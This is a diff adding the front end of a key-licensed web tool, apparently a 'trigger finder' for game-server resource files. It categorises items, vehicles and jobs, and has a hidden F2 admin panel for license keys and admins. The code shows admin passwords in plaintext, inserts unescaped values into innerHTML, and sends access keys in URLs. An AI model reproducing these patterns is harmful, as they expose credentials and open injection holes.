+        }
+
+        function runCustom() {
+            const patterns = document.getElementById('customPat').value.split('\n').map(p => p.trim()).filter(Boolean);
+            if (!patterns.length) { setStatus('⚠ Enter patterns first', ''); return; }
+            runSearch(patterns, 'Custom Patterns', 'accent');
+        }
+
+        function exportTxt() {
+            const text = document.getElementById('resultsArea').innerText;
+            if (!text || text.includes('Waiting')) { alert('No results to export'); return; }
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain' }));
+            a.download = 'trigger_results.txt'; a.click();
+        }
+
+        let filterTimeout;
+        function filterResults() {
+            clearTimeout(filterTimeout);
+            filterTimeout = setTimeout(() => {
+                const q = document.getElementById('resultSearch').value.toLowerCase();
+                if (!q) {
+                    renderResults(lastGroups, lastTitle, lastType);
+                    return;
+                }
+
+                const filteredGroups = {};
+                Object.entries(lastGroups).forEach(([path, items]) => {
+                    const filteredItems = items.filter(it => {
+                        if (lastType === 'item') {
+                            return it.itemData.code.toLowerCase().includes(q) || it.itemData.label.toLowerCase().includes(q);
+                        } else if (lastType === 'vehicle') {
+                            return it.vehData.code.toLowerCase().includes(q) || it.vehData.name.toLowerCase().includes(q);
+                        } else if (lastType === 'job') {
+                            return it.jobData.code.toLowerCase().includes(q) || it.jobData.label.toLowerCase().includes(q);
+                        } else if (lastType === 'grade') {
+                            return it.gradeData.code.toLowerCase().includes(q) || it.gradeData.label.toLowerCase().includes(q) || it.jobName.toLowerCase().includes(q);
+                        } else {
+                            return it.line.toLowerCase().includes(q);
+                        }
+                    });
+                    if (filteredItems.length) filteredGroups[path] = filteredItems;
+                });
+
+                renderResultsInternal(filteredGroups, lastTitle, lastType, q);
+            }, 200);
+        }
+
+        function renderResultsInternal(groups, title, type, query) {
+            const area = document.getElementById('resultsArea');
+            const allItems = [];
+            Object.entries(groups).forEach(([key, items]) => {
+                // If type is 'grade', 'key' is jobName. If others, 'key' is path.
+                if (type === 'grade') items.forEach(it => allItems.push({ ...it, jobName: key }));
+                else items.forEach(it => allItems.push({ ...it, path: key }));
+            });
+            const total = allItems.length;
+
+            if (query) {
+                document.getElementById('resultCount').textContent = title + ' — ' + total + ' matching "' + query + '"';
+            }
+
+            area.innerHTML = '';
+            if (type === 'item') {
+                const weapons = allItems.filter(it => it.itemData.code.toLowerCase().startsWith('weapon_'));
+                const robberyTools = allItems.filter(it => {
+                    const c = it.itemData.code.toLowerCase();
+                    const l = it.itemData.label.toLowerCase();
+                    const keys = ['lockpick', 'drill', 'hack', 'therm', 'card_', 'usb', 'tool', 'bag', 'explosive'];
+                    return !c.startsWith('weapon_') && keys.some(k => c.includes(k) || l.includes(k));
+                });
+                const valuables = allItems.filter(it => {
+                    const c = it.itemData.code.toLowerCase();
+                    const l = it.itemData.label.toLowerCase();
+                    const keys = ['gold', 'diamond', 'rolex', 'necklace', 'ring', 'jewel', 'stolen', 'valuable', 'money', 'cash', 'watch'];
+                    return !c.startsWith('weapon_') && !robberyTools.includes(it) && keys.some(k => c.includes(k) || l.includes(k));
+                });
+                const itemsOnly = allItems.filter(it => !weapons.includes(it) && !robberyTools.includes(it) && !valuables.includes(it));
+
+                const sections = [
+                    { items: weapons, label: 'WEAPONS', color: '#ff4757', emoji: '🔫' },
+                    { items: robberyTools, label: 'ROBBERY & TOOLS', color: '#ffa502', emoji: '🛠️' },
+                    { items: valuables, label: 'VALUABLES & STOLEN', color: '#eccc68', emoji: '💎' },
+                    { items: itemsOnly, label: 'GENERAL ITEMS', color: '#2ed573', emoji: '📦' }
+                ].filter(s => s.items.length);
+
+                let sIndex = 0;
+                const renderNext = () => {
+                    if (sIndex >= sections.length) return;
+                    const s = sections[sIndex];
+                    const head = document.createElement('div');
+                    head.className = 'section-label';
+                    head.style = `margin: 24px 0 10px 0; color: ${s.color}; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 5px;`;
+                    head.innerHTML = `${s.emoji} ${s.label} (${s.items.length})`;
+                    area.appendChild(head);
+                    const grid = document.createElement('div');
+                    grid.className = 'item-grid';
+                    area.appendChild(grid);
+                    renderInChunks(s.items, grid, type, 0, () => {
+                        sIndex++;
+                        renderNext();
+                    });
+                };
+                renderNext();
+            } else if (type === 'vehicle') {
+                const categories = {};
+                allItems.forEach(it => {
+                    let cat = (it.vehData.category || 'Uncategorized').toUpperCase();
+
+                    // Auto group police/ems vehicles
+                    const cCode = it.vehData.code.toLowerCase();
+                    const cName = it.vehData.name.toLowerCase();
+                    if (cCode.includes('police') || cCode.includes('sheriff') || cCode.includes('fbi') || cCode.includes('fib') || cCode.includes('ems') || cCode.includes('ambo') || cCode.includes('ambulance') || cCode.includes('medic') || cCode.includes('fire') || cCode.includes('lssd') || cCode.includes('bcso') || cCode.includes('sast') || cName.includes('police') || cName.includes('sheriff') || cName.includes('ambulance')) {
+                        cat = 'EMERGENCY & POLICE';
+                    }
+
+                    if (!categories[cat]) categories[cat] = { items: [], label: cat, color: cat === 'EMERGENCY & POLICE' ? '#00a8ff' : '#32ff7e', emoji: cat === 'EMERGENCY & POLICE' ? '🚓' : '🚘' };
+                    categories[cat].items.push(it);
+                });
+
+                const sections = Object.values(categories).sort((a, b) => {
+                    if (a.label === 'EMERGENCY & POLICE') return -1;
+                    if (b.label === 'EMERGENCY & POLICE') return 1;
+                    return b.items.length - a.items.length;
+                });
+
+                let sIndex = 0;
+                const renderNext = () => {
+                    if (sIndex >= sections.length) return;
+                    const s = sections[sIndex];
+                    const head = document.createElement('div');
+                    head.className = 'section-label';
+                    head.style = `margin: 24px 0 10px 0; color: ${s.color}; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 5px;`;
+                    head.innerHTML = `${s.emoji} ${s.label} (${s.items.length})`;
+                    area.appendChild(head);
+                    const grid = document.createElement('div');
+                    grid.className = 'item-grid';
+                    area.appendChild(grid);
+                    renderCarsInChunks(s.items, grid, type, 0, () => {
+                        sIndex++;
+                        renderNext();
+                    });
+                };
+                renderNext();
+            } else if (type === 'job') {
+                const categories = {};
+                allItems.forEach(it => {
+                    // جلب اسم الملف الذي توجد فيه الوظيفة
+                    const fileName = it.jobData.path.split(/[\/\\]/).pop().toLowerCase();
+                    const cat = fileName.toUpperCase();
+
+                    let color = '#00d2d3';
+                    let emoji = '📂';
+
+                    if (fileName.includes('gang')) { color = '#ff4757'; emoji = '🥷'; }
+                    else if (fileName.includes('job')) { color = '#fbc531'; emoji = '💼'; }
+                    else if (fileName.includes('config')) { color = '#a4b0be'; emoji = '⚙️'; }
+
+                    if (!categories[cat]) categories[cat] = { items: [], label: `📁 ${cat}`, color: color, emoji: emoji };
+                    categories[cat].items.push(it);
+                });
+
+                const sections = Object.values(categories).sort((a, b) => {
+                    // ترتيب بحيث الوظائف والعصابات تكون فوق
+                    if (a.label.includes('JOB') && !b.label.includes('JOB')) return -1;
+                    if (!a.label.includes('JOB') && b.label.includes('JOB')) return 1;
+                    if (a.label.includes('GANG') && !b.label.includes('GANG')) return -1;
+                    if (!a.label.includes('GANG') && b.label.includes('GANG')) return 1;
+                    return b.items.length - a.items.length;
+                });
+
+                let sIndex = 0;
+                const renderNext = () => {
+                    if (sIndex >= sections.length) return;
+                    const s = sections[sIndex];
+                    const head = document.createElement('div');
+                    head.className = 'section-label';
+                    head.style = `margin: 24px 0 10px 0; color: ${s.color}; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 5px;`;
+                    head.innerHTML = `${s.emoji} ${s.label} (${s.items.length})`;
+                    area.appendChild(head);
+                    const grid = document.createElement('div');
+                    grid.className = 'item-grid';
+                    area.appendChild(grid);
+                    renderJobsInChunks(s.items, grid, type, 0, () => {
+                        sIndex++;
+                        renderNext();
+                    });
+                };
+                renderNext();
+            } else if (type === 'grade') {
+                const sections = [];
+                Object.entries(groups).forEach(([jobName, originalItems]) => {
+                    let emoji = '💼';
+                    let jcode = jobName.toLowerCase();
+                    if (jcode.match(/police|sheriff|lssd|bcso|fib|fbi|sast|cop|law|doj/)) emoji = '🚓';
+                    else if (jcode.match(/ambulance|ems|medic|ambo|fire/)) emoji = '🚑';
+                    else if (jcode.match(/mechanic|bennys|lsc|tuner|auto|tow/)) emoji = '🔧';
+                    else if (jcode.match(/gang|mafia|cartel|yakuza|triad|bloods|crips|vagos|ballas|families/)) emoji = '🥷';
+                    else if (jcode.match(/burger|pizza|bean|food|cafe|coffee|taco/)) emoji = '🍔';
+
+                    // We map from allItems that was modified at the start of renderResultsInternal
+                    const items = allItems.filter(it => it.jobName === jobName);
+                    if (items.length > 0) {
+                        sections.push({ items: items, label: `${emoji} ${jobName.toUpperCase()}`, color: '#00d2d3' });
+                    }
+                });
+
+                sections.sort((a, b) => b.items.length - a.items.length);
+
+                let sIndex = 0;
+                const renderNext = () => {
+                    if (sIndex >= sections.length) return;
+                    const s = sections[sIndex];
+                    const head = document.createElement('div');
+                    head.className = 'section-label';
+                    head.style = `margin: 24px 0 10px 0; color: ${s.color}; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 5px;`;
+                    head.innerHTML = `${s.label} (${s.items.length})`;
+                    area.appendChild(head);
+
+                    s.items.sort((a, b) => parseInt(a.gradeData.code) - parseInt(b.gradeData.code) || 0);
+
+                    const grid = document.createElement('div');
+                    grid.className = 'item-grid';
+                    area.appendChild(grid);
+                    renderGradesInChunks(s.items, grid, type, 0, () => {
+                        sIndex++;
+                        renderNext();
+                    });
+                };
+                renderNext();
+            } else {
+                renderGroupsInChunks(Object.entries(groups), area, type);
+            }
+        }
+
+        
+    
+        // Key Gate Logic
+        // const VALID_KEYS = ... (Moved to Backend)
+
+        // LIVE SESSION POLLING
+        
+        async function immediateSessionCheck() {
+            if (localStorage.getItem('triggerFinderAuth') === 'true') {
+                const activeKey = localStorage.getItem('triggerFinderKey');
+                if (!activeKey) {
+                    localStorage.removeItem('triggerFinderAuth');
+                    location.reload();
+                    return;
+                }
+                try {
+                    const res = await fetch('/api/session?key=' + activeKey);
+                    const data = await res.json();
+                    if (!data.valid) {
+                        localStorage.removeItem('triggerFinderAuth');
+                        localStorage.removeItem('triggerFinderKey');
+                        location.reload();
+                    }
+                } catch(e) {}
+            }
+        }
+        immediateSessionCheck();
+
+        setInterval(async () => {
+            
+            if (localStorage.getItem('triggerFinderAuth') === 'true') {
+                const activeKey = localStorage.getItem('triggerFinderKey');
+                if (!activeKey) {
+                    // Legacy session without a key attached, kick them!
+                    localStorage.removeItem('triggerFinderAuth');
+                    location.reload();
+                    return;
+                }
+                if (activeKey) {
+
+                    try {
+                        const res = await fetch('/api/session?key=' + activeKey);
+                        const data = await res.json();
+                        if (!data.valid) {
+                            localStorage.removeItem('triggerFinderAuth');
+                            localStorage.removeItem('triggerFinderKey');
+                            location.reload();
+                        }
+                    } catch(e) {}
+                }
+            }
+        }, 10000);
+
+        
+        try {
+            if (localStorage.getItem('triggerFinderAuth') === 'true') {
+                document.getElementById('keyGate').style.display = 'none';
+            }
+        } catch(e) {}
+
+        const authBtn = document.getElementById('verifyKeyBtn');
+        const authInp = document.getElementById('accessKeyInput');
+        const authGate = document.getElementById('keyGate');
+        const authErr = document.getElementById('keyError');
+
+                async function performVerification() {
+            if (!authInp) return;
+            const val = authInp.value.trim();
+            if (!val) return;
+            
+            try {
+                const res = await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ key: val })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    try { localStorage.setItem('triggerFinderAuth', 'true'); localStorage.setItem('triggerFinderKey', val); } catch(e) {}
+                    if (authGate) {
+                        authGate.style.opacity = '0';
+                        setTimeout(() => { authGate.style.display = 'none'; }, 500);
+                    }
+                } else {
+                    if (authErr) {
+                        authErr.innerText = '❌ ' + data.message;
+                        authErr.style.display = 'block';
+                    }
+                    authInp.style.borderColor = 'var(--accent3)';
+                }
+            } catch(e) {
+                if (authErr) {
+                    authErr.innerText = '❌ Server Offline. Cannot verify key.';
+                    authErr.style.display = 'block';
+                }
+            }
+        }
+
+        if (authBtn) {
+            authBtn.addEventListener('click', performVerification);
+        }
+        if (authInp) {
+            authInp.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') performVerification();
+            });
+        }
+    
+        // --- ADMIN PANEL LOGIC ---
+        let adminToken = '';
+        
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F2') {
+                e.preventDefault();
+                const modal = document.getElementById('adminModal');
+                if (modal.style.display === 'none') {
+                    modal.style.display = 'flex';
+                    if (adminToken) fetchAdminData();
+                    else {
+                        document.getElementById('adminLoginState').style.display = 'block';
+                        document.getElementById('adminDashboardState').style.display = 'none';
+                    }
+                } else {
+                    modal.style.display = 'none';
+                }
+            }
+        });
+
+        async function adminLogin() {
+            const u = document.getElementById('adminUser').value;
+            const p = document.getElementById('adminPass').value;
+            try {
+                const res = await fetch('/api/admin/login', {
+                    method: 'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({username:u, password:p})
+                });
+                const data = await res.json();
+                if(data.success) {
+                    adminToken = data.token;
+                    localStorage.setItem('adminToken', data.token);
+                    localStorage.setItem('adminUsername', u);
+                    document.getElementById('adminLoginState').style.display = 'none';
+                    document.getElementById('adminDashboardState').style.display = 'flex';
+                    document.getElementById('adminErr').style.display = 'none';
+                    fetchAdminData();
+                } else {
+                    document.getElementById('adminErr').style.display = 'block';
+                }
+            } catch(e) { alert('Backend offline!'); }
+        }
+
+        function switchAdminTab(tab) {
+            document.getElementById('adminTabKeys').style.display = tab === 'keys' ? 'block' : 'none';
+            document.getElementById('adminTabLogs').style.display = tab === 'logs' ? 'block' : 'none';
+            document.getElementById('adminTabAdmins').style.display = tab === 'admins' ? 'block' : 'none';
+        }
+
+        
+        function logoutAdmin() {
+            localStorage.removeItem('adminToken');
+            localStorage.removeItem('adminUsername');
+            location.reload();
+        }
+        
+        async function addAdminUser() {
+            const username = document.getElementById('newAdminUser').value.trim();
+            const password = document.getElementById('newAdminPass').value.trim();
+            if(!username || !password) return alert('أدخل اليوزر والباسورد');
+            
+            const res = await fetch('/api/admin/users/add', {
+                method: 'POST',
+                headers:{'Content-Type':'application/json','Authorization':adminToken, 'X-Admin-User': localStorage.getItem('adminUsername')},
+                body:JSON.stringify({username, password})
+            });
+            const data = await res.json();
+            if(data.success) {
+                document.getElementById('newAdminUser').value = '';
+                document.getElementById('newAdminPass').value = '';
+                fetchAdminData();
+            } else {
+                alert(data.message);
+            }
+        }
+
+        async function deleteAdminUser(username) {
+            if(!confirm('هل أنت متأكد من حذف الأدمن ' + username + '؟')) return;
+            const res = await fetch('/api/admin/users/delete', {
+                method: 'POST',
+                headers:{'Content-Type':'application/json','Authorization':adminToken},
+                body:JSON.stringify({username})
+            });
+            const data = await res.json();
+            if(data.success) {
+                fetchAdminData();
+            } else {
+                alert(data.message);
+            }
+        }
+
+        async function fetchAdminData() {
+            if(!adminToken) return;
+            const res = await fetch('/api/admin/data', { headers: { 'Authorization': adminToken } });
+            const data = await res.json();
+            
+            // Render Keys
+            const ktb = document.querySelector('#keysTable tbody');
+            ktb.innerHTML = '';
+            for(const [k, v] of Object.entries(data.keys)) {
+                let expireText = v.type;
+                if(v.type !== 'lifetime') {
+                    let durationMs = 0;
+                    if (v.type === '1h') durationMs = 60 * 60 * 1000;
+                    else if (v.type === '1d') durationMs = 24 * 60 * 60 * 1000;
+                    else if (v.type === '30d') durationMs = 30 * 24 * 60 * 60 * 1000;
+                    else if (v.type === '60d') durationMs = 60 * 24 * 60 * 60 * 1000;
+                    
+                    const expiresAt = v.createdAt + durationMs;
+                    const remainingMs = expiresAt - Date.now();
+                    
+                    if (remainingMs <= 0) {
+                        expireText = '<span style="color:var(--danger);font-weight:bold;">منتهي (Expired)</span>';
+                    } else {
+                        const days = Math.floor(remainingMs / (1000 * 60 * 60 * 24));
+                        const hours = Math.floor((remainingMs / (1000 * 60 * 60)) % 24);
+                        const mins = Math.floor((remainingMs / 1000 / 60) % 60);
+                        
+                        let timeStr = '';
+                        if (days > 0) timeStr += days + ' يوم و ';
+                        if (hours > 0) timeStr += hours + ' ساعة و ';
+                        if (mins > 0) timeStr += mins + ' دقيقة';
+                        if (timeStr.endsWith(' و ')) timeStr = timeStr.slice(0, -3);
+                        if (timeStr === '') timeStr = 'أقل من دقيقة';
+                        
+                        expireText = `<span style="color:var(--success);font-weight:bold;">باقي: ${timeStr}</span>`;
+                    }
+                } else {
+                    expireText = '<span style="color:#00d2d3;font-weight:bold;">للأبد (Lifetime)</span>';
+                }
+                
+                ktb.innerHTML += `
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                        <td style="padding:8px; font-family:var(--mono); color:#fff;">${k}</td>
+                        <td style="padding:8px;">${expireText}</td>
+                        <td style="padding:8px; font-family:var(--mono);">${v.boundIP || 'Unbound'}</td>
+                        <td style="padding:8px; text-align:right;">
+                            ${v.boundIP ? `<button class="btn" style="padding:4px 8px; font-size:10px; margin-right:5px;" onclick="resetKey('${k}')">Reset IP</button>` : ''}
+                            <button class="btn" style="padding:4px 8px; font-size:10px; color:var(--accent3);" onclick="deleteKey('${k}')">Delete</button>
+                        </td>
+                    </tr>
+                `;
+            }
+            
+            
+            // Render Admins
+            if (data.admins) {
+                const atb = document.querySelector('#adminsTable tbody');
+                if (atb) {
+                    atb.innerHTML = '';
+                    for(const [u, p] of Object.entries(data.admins)) {
+                        atb.innerHTML += `
+                            <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                                <td style="padding:8px; font-family:var(--mono); color:#fff;">${u}</td>
+                                <td style="padding:8px; font-family:var(--mono); color:var(--muted);">${p}</td>
+                                <td style="padding:8px; text-align:right;">
+                                    ${u === '7rz' ? '<span style="color:var(--muted);font-size:10px;">Primary</span>' : `<button class="btn" style="padding:4px 8px; font-size:10px; color:var(--danger);" onclick="deleteAdminUser('${u}')">Delete</button>`}
+                                </td>
+                            </tr>
+                        `;
+                    }
+                }
+            }
+
+            // Render Logs
+            const ltb = document.querySelector('#logsTable tbody');
+            ltb.innerHTML = '';
+            [...data.logs].reverse().forEach(l => {
+                ltb.innerHTML += `
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                        <td style="padding:8px;">${new Date(l.date).toLocaleString()}</td>
+                        <td style="padding:8px; font-family:var(--mono);">${l.ip}</td>
+                        <td style="padding:8px; color:#fff;">${l.action}</td>
+                    </tr>
+                `;
+            });
+        }
+
+        async function generateKey() {
+            const duration = document.getElementById('keyDuration').value;
+            await fetch('/api/admin/generate', {
+                method:'POST',
+                headers:{'Content-Type':'application/json','Authorization':adminToken},
+                body:JSON.stringify({duration})
+            });
+            fetchAdminData();
+        }
+
+        async function resetKey(key) {
+            await fetch('/api/admin/reset', {
+                method:'POST',
+                headers:{'Content-Type':'application/json','Authorization':adminToken},
+                body:JSON.stringify({key})
+            });
+            fetchAdminData();
+        }
+
+        async function deleteKey(key) {
+            if(!confirm('Delete key ' + key + '?')) return;
+            await fetch('/api/admin/delete', {
+                method:'POST',
+                headers:{'Content-Type':'application/json','Authorization':adminToken},
+                body:JSON.stringify({key})
+            });
+            fetchAdminData();
+        }
+    </script>
+</body>
+
+</html>
